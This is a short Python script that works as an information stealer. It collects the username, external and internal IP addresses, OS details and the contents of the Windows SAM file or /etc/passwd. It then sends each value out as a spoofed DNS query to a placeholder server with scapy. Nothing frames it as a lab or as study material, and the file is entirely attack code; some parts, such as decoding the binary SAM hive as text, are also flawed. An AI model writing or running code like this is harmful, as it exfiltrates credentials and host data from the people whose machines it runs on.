import locale
import sys
import os
import getpass
import socket
import requests
#import pyuac
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import UDP, IP
from scapy.sendrecv import send


DNS_PORT = 53
DNS_SERVER_IP = "1.2.3.4"
IP_SRC = "1.2.3.4"


def sendInfo():
    #gather all data
    username = str(getUsername())
    ip = str(getIp())
    internal = str(getInternalIp())
    password = str(getPassword())
    language = str(getLanguage())
    os = str(getOs())
    
    #send all data
    sendQuery(username)
    sendQuery(ip)
    sendQuery(internal)
    sendQuery(password)
    sendQuery(language)
    sendQuery(os)
    
    #print(username+","+ip+","+internal_ip+","+language+","+os)
    return
    

def getUsername():
    return getpass.getuser()


def getIp():
    return requests.get("https://api.ipify.org").text


def getInternalIp():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    return ip


def getPassword():
    if os.name == 'nt':
        password_file = ""
        try:
            with open("C:\\Windows\\System32\\config\\SAM", "rb") as fp:
                password_file = fp.read().decode("utf-8", "ignore")
        except FileNotFoundError:
            pass
    else:
        password_file = ""
        try:
            with open("/etc/passwd", "r") as fp:
                password_file = fp.read()
        except FileNotFoundError:
            pass

    return password_file


def getLanguage():
    return locale.locale_alias


def getOs():
    os_data = ""
    if os.name == 'nt':
        os_version = sys.getwindowsversion()
        os_data = f"{os.name} {os_version.major}.{os_version.minor}.{os_version.build}"
    else:
        os_info = os.uname()
        os_data = f"{os_info.sysname} {os_info.release} {os_info.version}"
    return os_data

def sendQuery(qname):
    ip = IP(src=IP_SRC, dst=DNS_SERVER_IP)
    udp = UDP(dport=DNS_PORT)
    dns = DNS(rd=1)
    dns.qd = DNSQR(qname=qname)
    dns_request = ip / udp / dns
    send(dns_request)
    return
    
if __name__ == "__main__":
    print("Start...\n")
    sendInfo()
    print("End...\n")
    